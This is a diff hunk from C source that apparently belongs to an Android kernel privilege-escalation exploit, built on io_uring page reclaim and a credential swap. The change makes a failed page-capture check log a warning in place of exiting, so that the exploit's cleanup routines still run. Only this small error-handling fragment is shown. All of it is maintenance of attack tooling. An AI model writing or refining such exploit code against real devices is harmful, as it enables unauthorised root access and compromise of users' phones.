@@ -1441,7 +1441,11 @@ static uintptr_t prepare_kernel_page_tcl(int payload_mode) {
     if (!reclaim_one_uring(6000 + drain)) goto fail;
   }
   if (!tcl_capture_witness(base)) {
-    pr_error("TCL reclaim: capture is not proven; refusing the dangerous route\n");
+    /* This is an expected fail-closed outcome on production Android, where
+     * the shell's pagemap PFNs are normally masked.  pr_error() calls exit()
+     * and would bypass both this function's reclaim cleanup and the relay
+     * cleanup in run_cred_swap(). */
+    pr_warning("TCL reclaim: capture is not proven; refusing the dangerous route\n");
     errno = ENODATA;
     goto fail;
   }
